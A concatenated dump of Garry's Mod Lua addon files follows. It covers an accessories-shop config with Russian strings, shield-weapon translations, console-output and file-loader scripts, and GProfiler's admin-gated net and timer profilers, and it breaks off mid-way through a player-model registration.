SH_ACC.PurchaseFrac = 1

-- Different purchase price fractions for specific usergroups.
-- If available, this overrides the PurchaseFrac option but is overriden by PurchaseFracPlayers.
SH_ACC.PurchaseFracUsergroups = {
	-- ["admin"] = 0.1,
	-- ["superadmin"] = 0.1,
}

-- Different purchase price fractions for specific players.
-- SteamID only.
-- If available, this overrides the PurchaseFrac and PurchaseFracUsergroups options.
SH_ACC.PurchaseFracPlayers = {
	-- ["STEAM_0:0:0"] = 0.1,
}

-- How many accessories a player can wear at a time.
-- Set to 0 to remove the limit.
SH_ACC.MaximumWearable = 0

-- Different wearable accessory limit for specific usergroups.
-- If available, this overrides the MaximumWearable option but is overriden by MaximumWearablePlayers.
SH_ACC.MaximumWearableUsergroups = {
}

-- Different wearable accessory limit for specific players.
-- SteamID only.
-- If available, this overrides the MaximumWearable and MaximumWearableUsergroups options.
SH_ACC.MaximumWearablePlayers = {
	-- ["STEAM_0:0:0"] = 100,
}

-- Disable key shortcuts when using the shop.
-- TAB = toggle navigation bar
-- 1-9 = browse categories
-- Ctrl+F = open search bar
-- MOUSE4 (in adjust menu) = close adjust menu
SH_ACC.DisableKeyShortcuts = false

-- Disable the info tab.
-- Shows name, credits, version, add-ons enabled, how many accessories are installed and a link to the ScriptFodder page.
SH_ACC.DisableInfoTab = true

-- Where to spawn Accessories Vendor NPCs on the map.
-- Use the "sh_accessories_mypos" console command to get your current position and angle.
SH_ACC.NPCSpawns = {
	 --{pos = Vector(-1632, -1176, -196), ang = Angle(0, -90, 0)
	 {pos = Vector(-1559.000000, -1099.000000, -196.000000), ang = Angle(0, 90, 0)
},
}

-- How long equipping an accessory from the SWEP takes in seconds.
SH_ACC.DelayedEquipTime = 6

-- How long unequipping an accessory from the SWEP takes in seconds.
SH_ACC.DelayedUnequipTime = 1

-- Whether to send the (interface) content used by the script via Steam Workshop or FastDL.
SH_ACC.UseWorkshop = false

/****
	GENERAL CONFIGURATION
	Adjusting
****/

-- Should players be allowed to adjust their accessories?
-- Adjusting is moving, rotating or scaling an accessory slightly in case it doesn't or barely fits a player model.
SH_ACC.AllowAdjusting = false

-- Specific usergroups allowed (or not) to adjust accessories.
-- If available, this overrides the AllowAdjusting option but is overriden by AllowAdjustingPlayers.
SH_ACC.AllowAdjustingUsergroups = {
	-- ["admin"] = true,
	-- ["superadmin"] = true,
}

-- Allow specific players to adjust or not.
-- SteamID only.
-- If available, this overrides the AllowAdjusting and AllowAdjustingUsergroups options.
SH_ACC.AllowAdjustingPlayers = {
	-- ["STEAM_0:0:0"] = false,
}

-- Factor determining how much a player can adjust their accessory.
-- The smaller the value, the less the player will be able to adjust their accessory.
-- The higher, the (potentially) further they can move, rotate or scale it from their body, resulting in hilarious consequences.
-- Anything below or equal to 0 will produce unexpected results, so don't do that.
SH_ACC.AdjustFactor = 5

-- Different adjusting factors for specific usergroups.
-- If available, this overrides the AdjustFactor option but is overriden by AdjustFactorPlayers.
SH_ACC.AdjustFactorUsergroups = {
	-- ["admin"] = 100,
	-- ["superadmin"] = 100,
}

-- Different adjusting factors for specific players.
-- SteamID only.
-- If available, this overrides the AdjustFactor and AdjustFactorUsergroups options.
SH_ACC.AdjustFactorPlayers = {
	-- ["STEAM_0:0:0"] = 100,
}

-- How much translating, rotating and scaling are affected by adjustment.
-- Don't touch unless you've got a good reason to.
SH_ACC.IndividiualAdjustFactor = {
	translate = 0.5,
	rotate = 1,
	scale = 0.01,
}

/****
	GENERAL CONFIGURATION
	Selling
****/

-- Can players sell their accessories?
SH_ACC.AllowSelling = true  

-- Allow specific usergroups to sell or not.
-- If available, this overrides the AllowSelling option but is overriden by AllowSellingPlayers.
SH_ACC.AllowSellingUsergroups = {
	-- ["admin"] = true,
	-- ["superadmin"] = true,
}

-- Allow specific players to sell or not.
-- SteamID only.
-- If available, this overrides the AllowSelling and AllowSellingUsergroups options.
SH_ACC.AllowSellingPlayers = {
	-- ["STEAM_0:0:0"] = false,
}

-- Fraction of money players get by selling an accessory
-- Anything below 0 will result in unintended behavior!
SH_ACC.SellFrac = 0.5

-- Different sell value fractions for specific usergroups.
-- If available, this overrides the SellFrac option but is overriden by SellFracPlayers.
SH_ACC.SellFracUsergroups = {
	-- ["vip"] = 0.75,
	-- ["admin"] = 1,
	-- ["superadmin"] = 1,
}

-- Different sell value fractions for specific players.
-- SteamID only.
-- If available, this overrides the SellFrac and SellFracUsergroups options.
SH_ACC.SellFracPlayers = {
	-- ["STEAM_0:0:0"] = 100,
}

/****
	GENERAL CONFIGURATION
	Rendering
****/

-- Draw accessories on player bodies
SH_ACC.DrawOnBodies = true

-- Draw accessories on arrested players
SH_ACC.DrawOnArrested = false

-- Draw accessories even if they can't find the player's bone
-- (often they will be badly positionned, like real bad)
SH_ACC.DisplayWithEmptyBone = false

-- Maximum distance at which the accessories can be rendered. In units.
-- Set to 0 for infinite distance
SH_ACC.RenderDistance = 500 -- bilo750

/****
	GENERAL CONFIGURATION
	Interface
****/

-- Blur the blackground in black when the menu is open
SH_ACC.DrawBackgroundBlur = false

-- Show messages when equipping/unequipping something
SH_ACC.EquipMessages = false

-- Categories displayed in the Shop.
-- Here you can move categories around or even delete them.
SH_ACC.ShopCategories = {
	{text = "head", slot = SH_SLOT_HEAD, icon = Material("shenesis/accessory/hat.png", "noclamp smooth")},
	{text = "eyes", slot = SH_SLOT_EYES, icon = Material("shenesis/accessory/sunglasses.png", "noclamp smooth")},
	{text = "mouth", slot = SH_SLOT_MOUTH, icon = Material("shenesis/accessory/mask.png", "noclamp smooth")},
	{text = "neck", slot = SH_SLOT_NECK, icon = Material("shenesis/accessory/scarf.png", "noclamp smooth")},
	{text = "back", slot = SH_SLOT_BACK, icon = Material("shenesis/accessory/backpack.png", "noclamp smooth")},
}

/****
	STYLE CONFIGURATION
****/

-- Font to use for normal text throughout the interface.
SH_ACC.Font = "PT Root UI Medium"

-- Font to use for bold text throughout the interface.
SH_ACC.FontBold = "PT Root UI Medium"

-- Color sheet. Only modify if you know what you're doing
SH_ACC.Style = {
	header = Color(45, 45, 45, 253),
    bg = Color(35, 35, 35, 253),
    inbg = Color(50, 50, 50, 253),

	close_hover = Color(231, 76, 60, 255),
	hover = Color(255, 255, 255, 10, 255),
	hover2 = Color(100, 100, 100, 255, 255),


	text = Color(255, 255, 255, 255),
	text_down = Color(0, 0, 0),
	can_afford = Color(46, 204, 17),
	cant_afford = Color(231, 76, 60),
	equipped = Color(52, 152, 219),
	possessed = Color(241, 196, 15),
	restricted = Color(230, 126, 34),

	menu = Color(127, 140, 141),
}

/****
	LANGUAGE CONFIGURATION
****/

-- Names corresponding to each accessory slot.
-- You shouldn't have to modify this. Modify the Language table instead.
-- If you (manage to) add a new slot, make sure to register it here or the add-on will not work!
SH_ACC.SlotText = {
	[SH_SLOT_HEAD] = "head",
	[SH_SLOT_EYES] = "eyes",
	[SH_SLOT_MOUTH] = "mouth",
	[SH_SLOT_BACK] = "back",
	[SH_SLOT_NECK] = "neck",
}

-- Various strings used throughout the add-on. Change them to your language here.
-- %s and %d are special strings replaced with relevant info, keep them in the string!

-- French translation: http://pastebin.com/aHGFnN5A

SH_ACC.Language = {
	accessory_vendor = "Аксессуары",
	accessory_changer = "Аксессуары",

	toggle = "Включить",
	purchase = "Купить",
	sell = "Продать",
	equip = "Экипировать",
	unequip = "Убрать",
	adjust = "Регулировать",
	adjust_desc = "",
	quick_switch = "Смена аксессуара",
	accessory_limit = "Лимит аксессуаров",
	search = "Поиск",

	none = "Ничего",
	free = "Бесплатно",
	equipped = "Куплено",
	possessed = "Куплено",
	restricted = "Только VIP+",
	job_specific = "",
	yes = "Да",
	no = "Нет",
	info = "Инфо",

	translate = "", -- "Move" -- 
	rotate = "Поворот",
	scale = "Размер",
	reset_adjustments = "Сбросить",

	confirm_action = "Подтвердить изменения",
	buy_confirm = "Вы действительно хотите купить аксессуар за %s?",
	sell_confirm = "Вы действительно хотите продать %s за %s?",
	this_accessory_covers_x = "Заполняет несколько слотов: %s",
	failed_to_perform_action = "Ошибка.",
	cant_afford_x = "У вас не хватает денег на %s!",
	reached_acc_limit = "Вы достигли лимита аксессуаров, купите VIP+",
	cannot_purchase_accessory = "Не удается приобрести аксессуар",
	cannot_sell_accessory = "Не удается продать аксессуар",
	bad_usergroup = "Ваша привелегия не позволяет носить аксессуар.",

	you_equipped_x = "Вы теперь носите %s.",
	you_equipped_x_swapped_with_y = "Вы теперь носите %s (сменено %s).",
	you_unequipped_x = "Вы больше не носите %s.",
	you_purchased_x = "Вы приобрели %s!",
	you_sold_x_for_y = "Вы продали %s за %s!",
	equipping_to_acc = "Одеваем %s",
	unequipping_acc = "Снимаем %s",

	-- model panel instructions
	left_click_help = "ЛЕВЫЙ КЛИК: Право-лево",
	right_click_help = "ПРАВЫЙ КЛИК: Приближение",
	middle_click_help = "СРЕДНЯЯ КНОПКА МЫШИ: Перемещение модели",

	-- slots
	overview = "Обзор",
	head = "Голова",
	eyes = "Глаза",
	mouth = "Лицо",
	back = "Спина",
	neck = "Шея",
}
--PATH addons/cp_ballistic_shields/lua/ballistic_shields/sh_bs_lang.lua:
include( "ballistic_shields/sh_bs_util.lua" )

bshields.lang = {
	["English"] = {
		["sec"] = "[ПКМ] Видимость",
		["dshieldprim"] = "[ЛКМ] Применить",
		["hshieldprim"] = "[ЛКМ] Сломать дверь",
		["rshieldprim"] = "[ЛКМ] Атака",
		["hshieldcd1"] = "Подождите ",
		["hshieldcd2"] = " секунд что-бы сломать дверь!"	
	},
	["German"] = {
		["sec"] = "[RMB] SICHTBARKEIT",
		["dshieldprim"] = "[LMB] PLAZIEREN",
		["hshieldprim"] = "[LMB] TÜR AUFBRECHEN",
		["rshieldprim"] = "[LMB] ANGREIFEN",
		["hshieldcd1"] = "Warte ",
		["hshieldcd2"] = " Sekunden für das Aufbrechen der nächsten Tür!"	
	},
	["French"] = {
		["sec"] = "[RMB] VISIBILITÉ",
		["dshieldprim"] = "[LMB] DÉPLOYER",
		["hshieldprim"] = "[LMB] FORCER LA PORTE",
		["rshieldprim"] = "[LMB] ATTAQUER",
		["hshieldcd1"] = "Attendez ",
		["hshieldcd2"] = " secondes pour forcer la porte !"	
	},
	["Danish"] = {
		["sec"] = "[RMB] SIGTBARHED",
		["dshieldprim"] = "[LMB] SÆT",
		["hshieldprim"] = "[LMB] BREACH DØR",
		["rshieldprim"] = "[LMB] ANGRIB",
		["hshieldcd1"] = "Vent ",
		["hshieldcd2"] = " sekunder at bryde ved siden af!"   
	},
	["Turkish"] = {
		["sec"] = "[RMB] GORUNURLUK",
		["dshieldprim"] = "[LMB] YERLESTIR",
		["hshieldprim"] = "[LMB] BREACH DOOR",
		["rshieldprim"] = "[LMB] SALDIR",
		["hshieldcd1"] = "Bekle ",
		["hshieldcd2"] = " bir sonraki kapıyı kırmaya saniye kaldı!"   
	}
}  

if(bshields.lang[bshields.config.language]==nil) then bshields.config.language = "English" end
--PATH addons/epoe/lua/autorun/epoe_init.lua:
if epoe then -- Implements reloading it all
	-- Prevent hooks from calling


	if SERVER then
		pcall(function() --  in case it's something very weird
			epoe.InEPOE=true -- Disables EPOE functionality
			epoe.DisableTick()
		end)
		epoe=nil
		package.loaded.epoe=nil

	else -- TODO

		pcall(function()
			epoe.InEPOE=true
			e.GUI:Remove()
		end)
	end

end

include('epoe/shared.lua')


if SERVER then

	AddCSLuaFile("autorun/epoe_init.lua")

	AddCSLuaFile("epoe/client.lua")
	AddCSLuaFile("epoe/client_ui.lua")
	AddCSLuaFile("epoe/client_gui.lua")
	AddCSLuaFile("epoe/client_filter.lua")
	AddCSLuaFile("epoe/shared.lua")
	AddCSLuaFile("epoe/autoplace.lua")

	include('epoe/server.lua')

else
	include('epoe/client.lua')
	include('epoe/client_ui.lua')
	include("epoe/client_gui.lua")
	include('epoe/autoplace.lua')
	include("epoe/client_filter.lua")
end

--PATH addons/epoe/lua/epoe/client_ui.lua:
local e=epoe -- Why not just module("epoe") like elsewhere?
local TagHuman=e.TagHuman
---------------
-- Clientside Console UI
---------------
local epoe_toconsole=CreateClientConVar("epoe_toconsole", "1", true, false)
local epoe_toconsole_colors=CreateClientConVar("epoe_toconsole_colors", "1", true, false)

hook.Add(TagHuman,TagHuman..'_CLI',function(Text,flags,col)
	flags=flags or 0
	if e.HasFlag(flags,e.IS_EPOE) then
		Msg("[EPOE] ")print(Text)
		return
	end
	
	if not epoe_toconsole:GetBool() then return end
	
	if e.HasFlag(flags,e.IS_MSGC) and epoe_toconsole_colors:GetBool() and col then
		MsgC(col,Text)
		return
	end
	
	Msg(Text)

end)

--PATH addons/epoe/lua/epoe/autoplace.lua:
local epoe_autoplace = CreateClientConVar("epoe_autoplace", 0, true, false)
local epoe_autoplace_margin = CreateClientConVar("epoe_autoplace_margin", 0, true, false)
local epoe_autoplace_scale_x = CreateClientConVar("epoe_autoplace_scale_x", 0.5, true)
local epoe_autoplace_scale_y = CreateClientConVar("epoe_autoplace_scale_y", 0.25, true)

timer.Create("epoe_autoplace", 1, 0, function()
	if not epoe or not IsValid(epoe.GUI) then return end
	local place = math.floor(epoe_autoplace:GetFloat() or 0)
	if place < 1 or place > 9 then return end
	epoe.GUI:SetSize(surface.ScreenWidth() * epoe_autoplace_scale_x:GetFloat(), surface.ScreenHeight() * epoe_autoplace_scale_y:GetFloat())
	local margin = math.floor(epoe_autoplace_margin:GetFloat() or 0)
	local x, y = (place - 1) % 3 / 2, math.floor((place - 1) / 3) % 3 / 2
	local width, height = epoe.GUI:GetSize()
	local offset_x, offset_y = surface.ScreenWidth() - width - margin * 2, surface.ScreenHeight() - height - margin * 2
	epoe.GUI:SetPos(margin + offset_x * x, margin + offset_y * y)
end)

--PATH addons/enc_scripts/lua/autorun/es_loaded.lua:
ES = ES or {}
ES.Config = ES.Config or {}

function ES.MsgC(msg, clr)
	MsgC(Color(48, 156, 255), "[Scripts] ", clr, msg .. "\n")
end

do // yeaaaaa
    local blockedFile = {}
    local deblockedFile = {}

    function ES.IncludeDir(fileDir)
        local files, dirs = file.Find(fileDir .. "*", "LUA")

        for _, fileName in ipairs(files) do
            if (string.match(fileName, ".lua") and not blockedFile[fileName] and not deblockedFile[fileDir .. fileName]) then
                local filePrESix = string.sub(fileName, 1, 2)

                if SERVER and filePrESix ~= "sv" then
                    ES.MsgC("Adding File: " .. fileDir .. fileName, Color(0, 255, 0))
                    deblockedFile[fileDir .. fileName] = true
                    AddCSLuaFile(fileDir .. fileName)
                end

                if CLIENT and filePrESix ~= "sv" then
                    include(fileDir .. fileName)
                    deblockedFile[fileDir .. fileName] = true
                    ES.MsgC("Including File: " .. fileDir .. fileName, Color(0, 255, 0))
                end
                
                if SERVER and filePrESix ~= "cl" then
                    include(fileDir .. fileName)
                    deblockedFile[fileDir .. fileName] = true
                    ES.MsgC("Including File: " .. fileDir .. fileName, Color(0, 255, 0))
                end
            end
        end

        for _, dir in ipairs(dirs) do
            ES.IncludeDir(fileDir .. dir .. "/")
        end
    end
end

do
    hook.Add('OnGamemodeLoaded', 'ES:Loaded', function() // loading files only after loaded gamemode
        ES.IncludeDir("es/")
    end)
end
--PATH addons/admin_warns/lua/autorun/fam.lua:
FlameAdminManagement = FlameAdminManagement or {}
FlameAdminManagement.settings = FlameAdminManagement.settings or {}

local include_sv = SERVER and include or function() end
local include_cl = SERVER and AddCSLuaFile or include
local include_sh = function(f)
	include_sv(f)
	include_cl(f)
end

local white 	= Color(255, 255, 255)
local red 		= Color(255,80,80)
local green 	= Color(80, 255, 80)
local blue 		= Color(80,80,255)
local orange 	= Color(255,155,55)

include_sh("fam/config.lua")

--	Core
MsgC(red, "[GM] ", white, "Loading core...\n")
for _, f in SortedPairs( file.Find( "fam/core/sh_*.lua", "LUA" ) ) do
	include_sh("fam/core/" .. f)

	MsgC(green, "[SHARED] ", white, f .. "\n")
end 

for _, f in SortedPairs( file.Find( "fam/core/sv_*.lua", "LUA" ) ) do
	include_sv("fam/core/" .. f)
	MsgC(blue, "[SERVER] ", white, f .. "\n")
end 

for _, f in SortedPairs( file.Find( "fam/core/cl_*.lua", "LUA" ) ) do
	include_cl("fam/core/" .. f)
	MsgC(orange, "[CLIENT] ", white, f .. "\n")
end
MsgC(red, "[GM] ", white, "Core ready!\n")

-- VGUI
for _, f in SortedPairs( file.Find( "fam/vgui/*.lua", "LUA" ) ) do
	include_cl("fam/vgui/" .. f)
end

-- Langs
MsgC(red, "[GM] ", white, "Loading languages packets...\n")
local c = 0
for _, f in SortedPairs( file.Find( "fam/languages/*.lua", "LUA" ) ) do
	include_sh("fam/languages/" .. f)
	c = c + 1
end 
MsgC(red, "[GM] ", white, c .. " languages packets ready!\n")

-- Modules --TODO
--PATH addons/fpp/lua/fprofiler/util.lua:

-- Try to find the function represented by a string
function FProfiler.funcNameToObj(str)
    if isfunction(str) then return str end

    local times = FProfiler.Internal.getCallCounts()
    for func, _ in pairs(times) do
        if tostring(func) == str then return func end
    end

    local tbl = _G
    local exploded = string.Explode(".", str, false)
    if not exploded or not exploded[1] then return end

    for i = 1, #exploded - 1 do
        tbl = (tbl or {})[exploded[i]]
        if not istable(tbl) then return end
    end

    local func = (tbl or {})[exploded[#exploded]]

    if not isfunction(func) then return end

    return func
end

-- Read a file
function FProfiler.readSource(fname, startLine, endLine)
    if not file.Exists(fname, "GAME") then return "" end
    if startLine < 0 or endLine < 0 or endLine < startLine then return "" end

    local f = file.Open(fname, "r", "GAME")

    for i = 1, startLine - 1 do f:ReadLine() end

    local res = {}
    for i = startLine, endLine do
        table.insert(res, f:ReadLine() or "")
    end

    return table.concat(res, "\n")
end

--PATH addons/gprofiler/lua/gprofiler/sh_access.lua:
GProfiler.Access.AdminSystem = GProfiler.Access.AdminSystem or false

local function GlobalExists(name)
	local exists = false
	pcall(function() exists = _G[name] and true or false end)
	return exists
end

local AdminSystems = {
	["FAdmin"] = {
		Priority = 1,
		IsAvailable = function() return GlobalExists("FAdmin") end,
		RegisterPrivilege = function(name)
			FAdmin.Access.AddPrivilege(name, 2)
		end,
		CheckAccess = function(ply, name)
			return FAdmin.Access.PlayerHasPrivilege(ply, name)
		end
	},
	["ULX"] = {
		Priority = 2,
		IsAvailable = function() return GlobalExists("ULib") and GlobalExists("ulx") end,
		RegisterPrivilege = function(name)
			if SERVER then ULib.ucl.registerAccess(name, ULib.ACCESS_SUPERADMIN, "Allows access to GProfiler", "GProfiler") end
		end,
		CheckAccess = function(ply, name)
			return ULib.ucl.query(ply, name)
		end
	},
	["sAdmin"] = {
		Priority = 3,
		IsAvailable = function() return GlobalExists("sAdmin") end,
		RegisterPrivilege = function(name)
			sAdmin.registerPermission(name, "GProfiler", false)
		end,
		CheckAccess = function(ply, name)
			return sAdmin.hasPermission(ply, name)
		end
	},
	["xAdmin"] = {
		Priority = 4,
		IsAvailable = function() return GlobalExists("xAdmin") end,
		RegisterPrivilege = function(name)
			xAdmin.RegisterPermission(name, "Allows access to GProfiler", "GProfiler")
		end,
		CheckAccess = function(ply, name)
			return ply:xAdminHasPermission(name)
		end
	},
	["SAM"] = {
		Priority = 5,
		IsAvailable = function() return GlobalExists("SAM_LOADED") end,
		RegisterPrivilege = function(name)
			sam.permissions.add(name, "GProfiler", "superadmin")
		end,
		CheckAccess = function(ply, name)
			return ply:HasPermission(name)
		end
	},
	["CAMI"] = {
		Priority = 6,
		IsAvailable = function() return GlobalExists("CAMI") end,
		CheckAccess = function(ply, name)
			return ply:IsSuperAdmin()
		end
	}
}

function GProfiler.Access.FindAdminSystem()
	for name, system in SortedPairsByMemberValue(AdminSystems, "Priority") do
		if system.IsAvailable() then
			GProfiler.Access.AdminSystem = system
			GProfiler.Log("Found admin system: " .. name, 2)
			return
		end
	end

	GProfiler.Access.AdminSystem = false
end

function GProfiler.Access.RegisterPrivilege(name)
	if not GProfiler.Access.AdminSystem then
		GProfiler.Log("No admin system found, cannot register privilege: " .. name, 3)
		return
	end

	if GProfiler.Access.AdminSystem.RegisterPrivilege then
		GProfiler.Access.AdminSystem.RegisterPrivilege(name)
	end
end

hook.Add("Initialize", "GProfiler.Access.Register", function()
	GProfiler.Access.FindAdminSystem()
	GProfiler.Access.RegisterPrivilege("gprofiler")
end)

function GProfiler.Access.HasAccess(ply)
	if GProfiler.Config.AllowedSteamIDs[ply:SteamID64()] or GProfiler.Config.AllowedSteamIDs[ply:SteamID()] then return true end
	if not GProfiler.Access.AdminSystem then return false end
	return GProfiler.Access.AdminSystem.CheckAccess(ply, "gprofiler")
end

--PATH addons/gprofiler/lua/gprofiler/profilers/net/sh_net.lua:
GProfiler.Net = GProfiler.Net or {}
GProfiler.Net.IsDetoured = GProfiler.Net.IsDetoured or false
GProfiler.Net.ProfileData = GProfiler.Net.ProfileData or {}

local netReadHeader = net.ReadHeader
local util = util

function GProfiler.Net:DetourNet(ply)
	if not GProfiler.Access.HasAccess(ply or LocalPlayer()) or GProfiler.Net.IsDetoured then return end

	GProfiler.Log((SERVER and "Server" or "Client") .. " net profile started!", 2)
	GProfiler.Net.ProfileData = {}
	GProfiler.Net.IsDetoured = true

	GProfiler.Net.OriginalIncoming = GProfiler.Net.OriginalIncoming or net.Incoming

	function net.Incoming(len, client)
		local i = netReadHeader()
		local strName = util.NetworkIDToString(i)

		if not strName then return end

		if not GProfiler.Net.ProfileData[strName] then
			GProfiler.Net.ProfileData[strName] = {0, 0, 0}
		end

		len = len - 16

		GProfiler.Net.ProfileData[strName][1] = GProfiler.Net.ProfileData[strName][1] + 1
		GProfiler.Net.ProfileData[strName][2] = math.max(GProfiler.Net.ProfileData[strName][2], len)
		GProfiler.Net.ProfileData[strName][3] = GProfiler.Net.ProfileData[strName][3] + len

		local func = net.Receivers[strName:lower()]
		if not func then return end

		if not GProfiler.Net.ProfileData[strName][4] then
			local Source = debug.getinfo(func, "S")
			if Source then
				GProfiler.Net.ProfileData[strName][4] = Source.short_src
				GProfiler.Net.ProfileData[strName][5] = Source.linedefined
				GProfiler.Net.ProfileData[strName][6] = Source.lastlinedefined
			end
		end

		func(len, client)
	end
end

function GProfiler.Net:RestoreNet(ply)
	if not GProfiler.Access.HasAccess(ply or LocalPlayer()) or not GProfiler.Net.IsDetoured then return end

	GProfiler.Log((SERVER and "Server" or "Client") .. " net profile stopped, sending data!", 2)
	GProfiler.Net.IsDetoured = false

	net.Incoming = GProfiler.Net.OriginalIncoming

	if SERVER then
		net.Start("GProfiler_Net_SendData")
		net.WriteUInt(table.Count(GProfiler.Net.ProfileData), 32)
		for name, data in pairs(GProfiler.Net.ProfileData) do
			net.WriteString(name)
			net.WriteUInt(data[1], 32)
			net.WriteUInt(data[2], 32)
			net.WriteUInt(data[3], 32)
			net.WriteString(data[4] or "")
			net.WriteUInt(data[5] or 0, 16)
			net.WriteUInt(data[6] or 0, 16)
		end
		net.Send(ply)
	end
end

if SERVER then
	util.AddNetworkString("GProfiler_Net_ToggleServerProfile")
	util.AddNetworkString("GProfiler_Net_ServerProfileStatus")
	util.AddNetworkString("GProfiler_Net_SendData")
	util.AddNetworkString("GProfiler_Net_ReceiverTbl")

	net.Receive("GProfiler_Net_ToggleServerProfile", function(len, ply)
		if not GProfiler.Access.HasAccess(ply) then return end

		local startStop = net.ReadBool()
		if startStop then
			GProfiler.Net:DetourNet(ply)
			net.Start("GProfiler_Net_ServerProfileStatus")
			net.WriteBool(true)
			net.WriteEntity(ply)
			net.Broadcast()
		else
			GProfiler.Net:RestoreNet(ply)
			net.Start("GProfiler_Net_ServerProfileStatus")
			net.WriteBool(false)
			net.WriteEntity(ply)
			net.Broadcast()
		end
	end)

	net.Receive("GProfiler_Net_ReceiverTbl", function(len, ply)
		if not GProfiler.Access.HasAccess(ply) then return end

		net.Start("GProfiler_Net_ReceiverTbl")
		net.WriteUInt(table.Count(net.Receivers), 32)
		for name, func in pairs(net.Receivers) do
			local Source = debug.getinfo(func, "S") or {}
			net.WriteString(name)
			net.WriteString(string.format("%s (%s)", tostring(func), GProfiler.GetFunctionLocation(func)))
			net.WriteString(Source.short_src or "")
			net.WriteUInt(Source.linedefined or 0, 16)
			net.WriteUInt(Source.lastlinedefined or 0, 16)
		end
		net.Send(ply)
	end)
end

--PATH addons/gprofiler/lua/gprofiler/profilers/timers/sh_timers.lua:
-- For timers, we must detour instantly, as there is no way to get timers created before the detour was created.

GProfiler.Timers = GProfiler.Timers or {}
GProfiler.Timers.Simple = GProfiler.Timers.Simple or {}
GProfiler.Timers.Create = GProfiler.Timers.Create or {}
GProfiler.Timers.IsDetoured = GProfiler.Timers.IsDetoured or false
GProfiler.Timers.OldSimpleTimer = GProfiler.Timers.OldSimpleTimer or timer.Simple
GProfiler.Timers.OldCreateTimer = GProfiler.Timers.OldCreateTimer or timer.Create

-- Chunked net messages to avoid net message overflow
local chunkSizeLimit = 65535 -- 187765611979610789976877

function GProfiler.Timers:Start(ply)
	if not GProfiler.Access.HasAccess(ply or LocalPlayer()) then return end

	if GProfiler.Timers.IsDetoured then return end

	GProfiler.Log((SERVER and "Server" or "Client") .. " timer profile started!", 2)
	GProfiler.Timers.IsDetoured = true
	GProfiler.Timers.Simple = {}
	GProfiler.Timers.Create = {}
end

function GProfiler.Timers:Stop(ply)
	if not GProfiler.Access.HasAccess(ply or LocalPlayer()) then return end

	if not GProfiler.Timers.IsDetoured then return end

	GProfiler.Log((SERVER and "Server" or "Client") .. " timer profile stopped, sending data!", 2)
	GProfiler.Timers.IsDetoured = false

	if SERVER then
		local ProfileData = table.Merge(GProfiler.Timers.Simple, GProfiler.Timers.Create)
		local chunkCount = 1
		local currentChunkSize = 0
		local chunks = {}
		for k, v in pairs(ProfileData) do
			local chunkSize = 146 + string.len(v.Type) + string.len(tostring(k)) + string.len(v.Source)
			if currentChunkSize + chunkSize > chunkSizeLimit then
				chunkCount = chunkCount + 1
				currentChunkSize = 0
			end

			if not chunks[chunkCount] then chunks[chunkCount] = {} end
			currentChunkSize = currentChunkSize + chunkSize
			table.insert(chunks[chunkCount], {k, v})
		end

		for k, v in ipairs(chunks) do
			net.Start("GProfiler_Timers_SendData")
				net.WriteBool(k == 1)
				net.WriteBool(k == table.Count(chunks))
				net.WriteUInt(table.Count(v), 32)
				for _, data in ipairs(v) do
					net.WriteString(data[2].Type)
					net.WriteString(tostring(data[1]))
					net.WriteUInt(data[2].Count, 32)
					net.WriteFloat(data[2].Delay)
					net.WriteFloat(data[2].TotalTime)
					net.WriteFloat(data[2].LongestTime)
					net.WriteFloat(data[2].AverageTime)
					net.WriteString(data[2].Source)
					net.WriteUInt(data[2].Lines[1], 16)
					net.WriteUInt(data[2].Lines[2], 16)
				end
			net.Send(ply)
		end

		if table.Count(chunks) == 0 then
			net.Start("GProfiler_Timers_SendData")
				net.WriteBool(true)
				net.WriteBool(true)
				net.WriteUInt(0, 32)
			net.Send(ply)
		end
	end
end

function GProfiler.Timers.CollectTimerData(type, name, delay, func, funcTime)
	if not GProfiler.Timers.IsDetoured then return end

	if not GProfiler.Timers[type][name] then
		local dbgInfo = debug.getinfo(func)
		GProfiler.Timers[type][name] = {
			Count = 0,
			TotalTime = 0,
			LongestTime = 0,
			AverageTime = 0,
			Func = func,
			Delay = delay,
			Source = dbgInfo.short_src,
			Lines = {dbgInfo.linedefined, dbgInfo.lastlinedefined},
			Type = type
		}
	end

	GProfiler.Timers[type][name].Count = GProfiler.Timers[type][name].Count + 1
	GProfiler.Timers[type][name].TotalTime = GProfiler.Timers[type][name].TotalTime + funcTime
	GProfiler.Timers[type][name].AverageTime = GProfiler.Timers[type][name].TotalTime / GProfiler.Timers[type][name].Count
	GProfiler.Timers[type][name].LongestTime = math.max(GProfiler.Timers[type][name].LongestTime, funcTime)
end

timer.Simple = function(delay, func, ...)
	local args = {...}
	GProfiler.Timers.OldSimpleTimer(delay, function()
		local start = SysTime()
		func(unpack(args))
		local endtime = SysTime() - start
		GProfiler.Timers.CollectTimerData("Simple", func, delay, func, endtime)
	end)
end

timer.Create = function(name, delay, reps, func, ...)
	assert(name, "timer.Create - bad argument #1 (string expected, got no value)")
	assert(delay, "timer.Create - bad argument #2 (number expected, got no value)")
	assert(reps, "timer.Create - bad argument #3 (number expected, got no value)")
	assert(func, "timer.Create - bad argument #4 (function expected, got no value)")

	name = tostring(name)

	local args = {...}
	GProfiler.Timers.OldCreateTimer(name, delay, reps, function()
		local start = SysTime()
		func(unpack(args))
		local endtime = SysTime() - start
		GProfiler.Timers.CollectTimerData("Create", name, delay, func, endtime)
	end)
end
if SERVER then
	util.AddNetworkString("GProfiler_Timers_ToggleServerProfile")
	util.AddNetworkString("GProfiler_Timers_ServerProfileStatus")
	util.AddNetworkString("GProfiler_Timers_SendData")

	net.Receive("GProfiler_Timers_ToggleServerProfile", function(len, ply)
		if not GProfiler.Access.HasAccess(ply) then return end

		local startStop = net.ReadBool()
		if startStop then
			GProfiler.Timers:Start(ply)
			net.Start("GProfiler_Timers_ServerProfileStatus")
			net.WriteBool(true)
			net.WriteEntity(ply)
			net.Broadcast()
		else
			GProfiler.Timers:Stop(ply)
			net.Start("GProfiler_Timers_ServerProfileStatus")
			net.WriteBool(false)
			net.WriteEntity(ply)
			net.Broadcast()
		end
	end)
end
--PATH addons/kemono_friends_gray_wolf_pm_npc_1448349187/lua/autorun/gray_wolf_kemono_friends.lua:
player_manager.AddValidModel( "Gray Wolf", "models/kemono_friends/gray_wolf/gray_wolf_player.mdl" );
player_manager.AddValidHands( "Gray Wolf", "models/kemono_friends/gray_wolf/gray_wolf_arms.mdl", 0, "00000000" )

local Category = "Kemono Friends"

local NPC = { 	Name = "Gray Wolf - Friendly", 
				Class = "npc_citizen",
				Model = "models/kemono_friends/gray_wolf/gray_wolf_npc.mdl",
				Health = "100",
				KeyValues = { citizentype = 4 },
				Category = Category	}

